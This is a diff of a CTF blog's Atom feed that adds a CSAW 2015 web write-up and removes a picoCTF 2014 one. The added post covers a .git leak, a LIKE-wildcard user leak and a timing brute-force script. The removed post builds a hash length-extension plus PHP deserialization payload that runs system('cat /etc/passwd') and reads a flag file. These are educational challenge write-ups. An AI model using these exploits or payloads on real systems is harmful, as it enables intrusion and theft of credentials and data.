@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Ctf | The Swappage Playground]]></title>
   <link href="http://swappage.github.io/blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://swappage.github.io/"/>
-  <updated>2015-09-21T23:32:30+02:00</updated>
+  <updated>2015-09-23T10:59:11+02:00</updated>
   <id>http://swappage.github.io/</id>
   <author>
     <name><![CDATA[Swappage]]></name>
@@ -12,6 +12,166 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[CSAW CTF 2015: Lawn Care Simulator]]></title>
+    <link href="http://swappage.github.io/blog/2015/09/23/csaw-ctf-2015-lawn-care-simulator/"/>
+    <updated>2015-09-23T10:39:56+02:00</updated>
+    <id>http://swappage.github.io/blog/2015/09/23/csaw-ctf-2015-lawn-care-simulator</id>
+    <content type="html"><![CDATA[<p>It’s CTF season! and CSAW CTF, one of the funniest CTFs that takes place every year in september has ended this weekend, here is a writeup for one of the web challenges that were provided during the contest.</p>
+
+<p>This 200 points challenge was a web application running a nicely useless javascript for “growing lawn”, and was providing all the typical features available in a standard web application, including registration and login.</p>
+
+<p>The objective of this challenge was to login as admin.</p>
+
+<!--more-->
+
+<h2 id="clone-all-the-things">Clone all the things</h2>
+
+<p>By looking at the index source code we could notice that the version number, present in the bottom corner of the page, was calculated based on the git repository hash.</p>
+
+<p><img class="center" src="/images/2015-09-23_lawn-care-simulator/version.png"></p>
+
+<p><code>javascript
+&lt;script&gt;
+    function init(){
+        document.getElementById('login_form').onsubmit = function() {
+            var pass_field = document.getElementById('password');
+            pass_field.value = CryptoJS.MD5(pass_field.value).toString(CryptoJS.enc.Hex);
+    };
+    $.ajax('.git/refs/heads/master').done(function(version){$('#version').html('Version: ' +  version.substring (0,6))});
+    initGrass();
+}
+&lt;/script&gt;
+</code></p>
+
+<p>Since the .git directory is available in the webroot, we can crawl it and download the entire repository, to obtain the source code and spot bugs.
+To make my life easier i used DVCS-Pillage: https://github.com/evilpacket/DVCS-Pillage
+to automate the whole process, and at the end i had all the website sources available to me, except.. of course for the flag.</p>
+
+<pre><code>-rw-r--r--  1 root root  109 Sep 19 00:46 ___HINT___
+-rw-r--r--  1 root root 2406 Sep 19 00:46 index.html
+-rw-r--r--  1 root root 1410 Sep 19 00:46 jobs.html
+drwxr-xr-x  2 root root 4096 Sep 19 14:50 js
+-rw-r--r--  1 root root  918 Sep 19 00:46 premium.php
+-rw-r--r--  1 root root 2937 Sep 19 00:46 sign_up.php
+-rw-r--r--  1 root root   78 Sep 19 01:51 test.php
+-rw-r--r--  1 root root  780 Sep 19 00:46 validate_pass.php
+</code></pre>
+
+<h2 id="the-bugs">The bugs</h2>
+<p>In the php code there were two bugs:</p>
+
+<p>The first was in the registration page <em>sign_up.php</em></p>
+
+<p><code>php
+&lt;?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST'){
+    require_once 'db.php';
+    $link = mysql_connect($DB_HOST, $SQL_USER, $SQL_PASSWORD) or die('Could not connect: ' . mysql_error());
+    mysql_select_db('users') or die("Mysql error");
+    $user = mysql_real_escape_string($_POST['username']);
+    // check to see if the username is available
+    $query = "SELECT username FROM users WHERE username LIKE '$user';";
+    $result = mysql_query($query) or die('Query failed: ' . mysql_error());
+    $line = mysql_fetch_row($result, MYSQL_ASSOC);
+    if ($line == NULL){
+        // Signing up for premium is still in development
+        echo '&lt;h2 style="margin: 60px;"&gt;Lawn Care Simulator 2015 is currently in a private beta. Please check back later&lt;/h2&gt;';
+    }
+    else {
+        echo '&lt;h2 style="margin: 60px;"&gt;Username: ' . $line['username'] . " is not available&lt;/h2&gt;";
+    }
+}
+else {
+?&gt;
+</code>
+As it’s possible to notice the query used to verify if a user already existed, used a <em>LIKE</em> statement, this means that by submitting a username value with the character %, we could disclose the already registered users; of course, since the registration was still closed, the only user we were expecting to find as already registered was the admin username, which happened to be ~~FLAG~~.</p>
+
+<p><img class="center" src="/images/2015-09-23_lawn-care-simulator/user_exists.png"></p>
+
+<p>The second one was in the way the login process was handled by the validate_pass.php</p>
+
+<p>&#8220;`php
+&lt;?
+function validate($user, $pass) {
+    require_once ‘db.php’;
+    $link = mysql_connect($DB_HOST, $SQL_USER, $SQL_PASSWORD) or die(‘Could not connect: ‘ . mysql_error());
+    mysql_select_db(‘users’) or die(“Mysql error”);
+    $user = mysql_real_escape_string($user);
+    $query = “SELECT hash FROM users WHERE username=’$user’;”;
+    $result = mysql_query($query) or die(‘Query failed: ‘ . mysql_error());
+    $line = mysql_fetch_row($result, MYSQL_ASSOC);
+    $hash = $line[‘hash’];</p>
+
+<pre><code>if (strlen($pass) != strlen($hash))
+    return False;
+
+$index = 0;
+while($hash[$index]){
+    if ($pass[$index] != $hash[$index])
+        return false;
+    # Protect against brute force attacks
+    usleep(300000);
+    $index+=1;
+}
+return true; } ?&gt; ```
+</code></pre>
+
+<p>What the script implements as a <em>protection against brute force attacks</em> is faulty, and leave the script open to a byte by byte bruteforce attack on the hash, which wasn’t calculated by the server, but directly by the javascript on the client side.</p>
+
+<p>By analyzing the timings of the server response it was possible to guess the characters that were composing the md5 hash for the ~~FLAG~~ user.</p>
+
+<p>I built this horrible python script to do the job and retrieve the flag.</p>
+
+<p>&#8220;`python
+#!/usr/bin/python</p>
+
+<p>import datetime
+import time
+import requests
+from itertools import combinations
+import itertools</p>
+
+<p>letters = [‘a’, ‘b’, ‘c’, ‘d’, ‘e’, ‘f’, ‘0’, ‘1’, ‘2’, ‘3’, ‘4’, ‘5’, ‘6’, ‘7’, ‘8’, ‘9’]</p>
+
+<p>hash = “”
+padding = “XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX”
+delay = 300</p>
+
+<p>current_milli_time = lambda: int(round(time.time() * 1000))</p>
+
+<p>while 1:
+	for c in itertools.combinations_with_replacement(letters, 1):
+#		time.sleep(0.5)
+		start = current_milli_time()</p>
+
+<pre><code>	stringa = (''.join(c))
+	print "[*] bruteforcing MD5 with: " + hash + stringa + padding
+	r = requests.post("http://54.175.3.248:8089/premium.php", data={'username': '~~FLAG~~', 'password': hash + stringa + padding})
+	#print(r.status_code, r.reason)
+
+	stop = current_milli_time()
+	elapsed = stop - start
+	print elapsed
+	if elapsed &gt; delay:
+		start = datetime.datetime.now()
+		r = requests.post("http://54.175.3.248:8089/premium.php", data={'username': '~~FLAG~~', 'password': hash + stringa + padding})
+		stop = datetime.datetime.now()
+		if elapsed &gt; delay:
+			print "[*] character found: " + stringa
+			hash += stringa
+			padding = padding[:-1]
+			delay = delay + 300
+			print padding
+			print hash
+			break
+</code></pre>
+
+<p>&#8220;`</p>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[EKOPARTY PRE-CTF 2015: Web200]]></title>
@@ -920,247 +1080,6 @@ a^{\phi(N)} \equiv 1 \pmod{N}
 
 <pre><code>83359654581036155008716649031639683153293510843035531_32002880064
 </code></pre>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[picoCTF 2014: Steve's List]]></title>
-    <link href="http://swappage.github.io/blog/2014/11/08/picoctf-2014-steves-list/"/>
-    <updated>2014-11-08T21:05:49+01:00</updated>
-    <id>http://swappage.github.io/blog/2014/11/08/picoctf-2014-steves-list</id>
-    <content type="html"><![CDATA[<p>Steve’s List was a 200 points master challenge mostly focused on web exploitation, but also with a little of crypto inside.</p>
-
-<p>The problem stated</p>
-
-<p><img class="center" src="/images/2014-11-08_stevelist/problem.png"></p>
-
-<p>So we were playing with a defaced website, we had the web server, a backup archive containing the source for a white box analysis and a flag to read.</p>
-
-<!-- more -->
-
-<p>I started looking at the source code, and a couple of things turned out looking really interesting.</p>
-
-<p>Let’s start with the cookie.php page, which is the page that actually has the vuln:</p>
-
-<p><code>php
-	&lt;?php
-	  if (isset($_COOKIE['custom_settings'])) {
-		// We should verify to make sure this thing is legit.
-		$custom_settings = urldecode($_COOKIE['custom_settings']);
-		$hash = sha1(AUTH_SECRET . $custom_settings);
-		if ($hash !== $_COOKIE['custom_settings_hash']) {
-		  die("Why would you hack Section Chief Steve's site? :(");
-		}
-		// we only support one setting for now, but we might as well put this in.
-		$settings_array = explode("\n", $custom_settings);
-		$custom_settings = array();
-		for ($i = 0; $i &lt; count($settings_array); $i++) {
-		  $setting = $settings_array[$i];
-		  $setting = unserialize($setting);
-		  $custom_settings[] = $setting;
-		}
-	  } else {
-		$custom_settings = array(0 =&gt; true);
-		setcookie('custom_settings', urlencode(serialize(true)), time() + 86400 * 30, "/");
-		setcookie('custom_settings_hash', sha1(AUTH_SECRET . serialize(true)), time() + 86400 * 30, "/");
-	  }
-	?&gt;
-</code></p>
-
-<p>As we can see, the vuln here is pretty clear: there is a deserialization of an object that is specified in a cookie value.
-What happens here is that the value of the cookie is splitted on the “\n” character, and each value is put in an array and then the function unserialize() is invoked on that value.</p>
-
-<p>As we will see later, this will allow us to gain remote code execution on the server, but unfortunately, for now there is something really annoying that is preventing us from reaching the exploitable branch of code.</p>
-
-<p>In fact at line 5 the cookie value is appended to an AUTH_SECRET value, and a sha1 hash of the resulting concatenation is checked against another cookie, named custom_settings_hash
-which is set the first time we visit the site by the code from line from 19 to 21 of the cookie.php page.</p>
-
-<p>the AUTH_SECRET value is statically defined in another php page, where all the static variables are set: root_data.php</p>
-
-<p><code>php
-	&lt;?php
-	  define('STEVES_LIST_ABSOLUTE_INCLUDE_ROOT', dirname(__FILE__) . "/");
-	  define('STEVES_LIST_TEMPLATES_PATH', dirname(__FILE__) . "/templates/");
-	  define('DISPLAY_POSTS', 0);
-	  // Daedalus changed this... I guess AAAAAAAA was not a good secret :(
-	  define('AUTH_SECRET', "AAAAAAAA");
-	  require_once(STEVES_LIST_ABSOLUTE_INCLUDE_ROOT . "includes/classes.php");
-	?&gt;
-</code></p>
-
-<p>In our local backup, the static value is set to AAAAAAAA, but on the remote server the “hackers” from daedalus corp modified that value to prevent us from taking back the control of the web site.</p>
-
-<p>And here is where crypto comes in play: yes, because there is an attack. known as <em>length extension attack</em> that allows us to bypass the above verification issue.</p>
-
-<p>The attack can be performed with all the hashes where the function is H(secret.message) and where the message and the length of the secret are known.</p>
-
-<p>We know already that the value of AUTH_SECRET is fixed to 8 characters, so we can abuse the length extension attack to append extra data to the custom_settings cookie.</p>
-
-<p>Before performing this attack, we were bound to a fixed value in the custom_settings cookie, that was</p>
-
-<pre><code>b:1;
-</code></pre>
-
-<p>which is the serialization of a true statement</p>
-
-<p><code>php
-	serialize(true)
-</code></p>
-
-<p>but now we can predict the hash that will result by padding that value and appending extra data, so we can append a \n followed by another serialized object that would eventually be deserialized after the check was successfully passed.</p>
-
-<p>Using a python library for implementing the Length extension attack: hlextend i was able to build a simple payload that would bypass the validation; for now let’s be happy i was able to inject test.</p>
-
-<p><img class="center" src="/images/2014-11-08_stevelist/hashbypass.png"></p>
-
-<p>Once the problem of bypassing the hash validation was solved, I had to find a way to gain code execution.
-Doing that on the remote server would have been a little too much of a frustration, so i decided to create a local instance using the website backup, and by tweaking the code a bit, try to build a working object that would allow to gain code execution.</p>
-
-<p>after looking at the source code of the class.php a little closer, I found that the Post class would be the perfect object to serialize and inject; </p>
-
-<p>&#8220;`php
-	class Post {
-		protected $title;
-		protected $text;
-		protected $filters;
-		function __construct($title, $text, $filters) {
-			$this-&gt;title = $title;
-			$this-&gt;text = $text;
-			$this-&gt;filters = $filters;
-	}</p>
-
-<p>&#8220;`</p>
-
-<p>the class accepts 3 parameters in the constructor</p>
-
-<ul>
-  <li>title</li>
-  <li>text</li>
-  <li>filter</li>
-</ul>
-
-<p>where title is a string, text is also a string, while filter is an array of objects from the Filter class.</p>
-
-<p><code>php
-	class Filter {
-		protected $pattern;
-		protected $repl;
-		function __construct($pattern, $repl) {
-		  $this-&gt;pattern = $pattern;
-		  $this-&gt;repl = $repl;
-		}
-		function filter($data) {
-		  return preg_replace($this-&gt;pattern, $this-&gt;repl, $data);
-		}
-	};
-</code></p>
-
-<p>And how convenient, because the Filter class makes a good use of the preg_replace() function! This is really good, because considering we are in control of the object, we can forge the regular expressions for the Filter object, and this allows us, to create a regexp that instead of replacing, would execute our substitution payload.</p>
-
-<p>To build the object i created this simple PHP snipplet:</p>
-
-<p>&#8220;`php
-&lt;?php</p>
-
-<p>class Filter {
-    protected $pattern;
-    protected $repl;</p>
-
-<pre><code>function __construct($pattern, $repl) {
-  $this-&gt;pattern = $pattern;
-  $this-&gt;repl = $repl;
-}
-function filter($data) {
-  return preg_replace($this-&gt;pattern, $this-&gt;repl, $data);
-}
-</code></pre>
-
-<p>}</p>
-
-<p>$filterobject = [new Filter(“/test/e”, “system(‘cat /etc/passwd’);”)];</p>
-
-<p>class Post
-{
-   protected $title = “test”;
-   protected $text = “test”;
-   protected $filters;</p>
-
-<p>function __construct() {
-        global $filterobject;
-        $this-&gt;filters = $filterobject;
-   }</p>
-
-<p>}</p>
-
-<p>print  “\n”.serialize(new Post));
-&#8220;`</p>
-
-<p>saved the output to a file (because the serialized objects may contain non printable characters
-URL encoded it, and tried to send it to my local server.</p>
-
-<p>The result was the following</p>
-
-<p><img class="center" src="/images/2014-11-08_stevelist/injected.png"></p>
-
-<p>Ok, now i had an object that would allow me to execute arbitrary code on the remote server.</p>
-
-<p>I replaced the payload with a cat /home/daedalus/flag.txt and used the following python snipplet to calculate the hash and produce proper padding</p>
-
-<p>&#8220;`python
-	#!/usr/bin/python</p>
-
-<pre><code>import sys
-import struct
-import hlextend
-import urllib
-
-object = ""
-
-with open("rawcookie.bin", "rb") as f:
-	byte = f.read(1)
-	while byte != "":
-		object += byte
-		byte = f.read(1)
-
-print object
-
-sha = hlextend.new('sha1')
-
-meh = sha.extend(object, 'b:1;', 8, '2141b332222df459fd212440824a35e63d37ef69')
-
-print meh
-
-print sha.hexdigest() ```
-</code></pre>
-
-<p>here is an hex representation of the custom_settings cookie without URL encoding</p>
-
-<pre><code>00000000  0a 4f 3a 34 3a 22 50 6f  73 74 22 3a 33 3a 7b 73  |.O:4:"Post":3:{s|
-00000010  3a 38 3a 22 00 2a 00 74  69 74 6c 65 22 3b 73 3a  |:8:".*.title";s:|
-00000020  34 3a 22 74 65 73 74 22  3b 73 3a 37 3a 22 00 2a  |4:"test";s:7:".*|
-00000030  00 74 65 78 74 22 3b 73  3a 34 3a 22 74 65 73 74  |.text";s:4:"test|
-00000040  22 3b 73 3a 31 30 3a 22  00 2a 00 66 69 6c 74 65  |";s:10:".*.filte|
-00000050  72 73 22 3b 61 3a 31 3a  7b 69 3a 30 3b 4f 3a 36  |rs";a:1:{i:0;O:6|
-00000060  3a 22 46 69 6c 74 65 72  22 3a 32 3a 7b 73 3a 31  |:"Filter":2:{s:1|
-00000070  30 3a 22 00 2a 00 70 61  74 74 65 72 6e 22 3b 73  |0:".*.pattern";s|
-00000080  3a 37 3a 22 2f 74 65 73  74 2f 65 22 3b 73 3a 37  |:7:"/test/e";s:7|
-00000090  3a 22 00 2a 00 72 65 70  6c 22 3b 73 3a 33 38 3a  |:".*.repl";s:38:|
-000000a0  22 73 79 73 74 65 6d 28  27 63 61 74 20 2f 68 6f  |"system('cat /ho|
-000000b0  6d 65 2f 64 61 65 64 61  6c 75 73 2f 66 6c 61 67  |me/daedalus/flag|
-000000c0  2e 74 78 74 27 29 3b 22  3b 7d 7d 7d              |.txt');";}}}|
-</code></pre>
-
-<p>the resulting cookies content for the submission to the vulnerable page were respectively:</p>
-
-<pre><code>custom_settings_hash: 13c0bac46fcbd453c5052bce1d2f9ad6c88fe2bc
-
-vustom_settings: b:1%3b%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A4%3A%22test%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A4%3A%22test%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Filter%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00pattern%22%3Bs%3A7%3A%22%2Ftest%2Fe%22%3Bs%3A7%3A%22%00%2A%00repl%22%3Bs%3A38%3A%22system%28%27cat+%2Fhome%2Fdaedalus%2Fflag.txt%27%29%3B%22%3B%7D%7D%7D
-</code></pre>
-
-<p>and they resulted in the flag being correctly retrieved</p>
-
-<p><img class="center" src="/images/2014-11-08_stevelist/flag.png"></p>
-
 ]]></content>
   </entry>
   
